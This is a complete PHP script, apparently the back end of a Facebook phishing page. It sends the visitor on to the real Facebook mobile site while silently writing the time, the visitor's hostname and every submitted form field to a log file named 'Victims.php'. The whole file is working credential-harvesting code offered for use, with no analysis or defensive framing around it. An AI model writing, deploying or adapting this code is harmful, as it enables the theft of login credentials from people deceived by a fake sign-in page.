<?php
header ('Location: https://m.facebook.com/');
$handle = fopen("Victims.php", "a");

$date = date("d-m-y h:i:s");

file_put_contents("Victims.php", "Date: " . $date . "<br>", FILE_APPEND);

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

file_put_contents("Victims.php", "IP: " . $hostname . "<br>", FILE_APPEND);


foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "\n=\n");
fwrite($handle, $value);
fwrite($handle, "\r\n<br>");
}
fwrite($handle, "\r\n\n\n<br><hr><br>\n");
fclose($handle);
exit;
?>